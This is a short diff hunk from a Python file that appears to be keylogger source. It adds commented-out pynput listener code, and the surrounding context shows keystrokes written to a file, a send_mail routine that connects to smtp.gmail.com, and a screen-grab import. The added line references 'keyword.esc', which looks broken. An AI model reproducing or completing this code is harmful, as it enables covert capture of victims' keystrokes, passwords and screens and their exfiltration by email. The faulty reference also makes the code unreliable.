@@ -63,6 +63,12 @@ from PIL import ImageGrab
 #                 elif k.find("Key") == -1:
 #                     f.write(k)
 
+#     def on_release(key):
+#         if key == keyword.esc:
+#             return False
+#     with Listener(on_press=process_key_press, on_release=on_release) as listener:
+#         listener.join()
+
 #     def send_mail(self, email, password, message):
 #         server = smtplib.SMTP("smtp.gmail.com", 587)
 #         server.starttls()
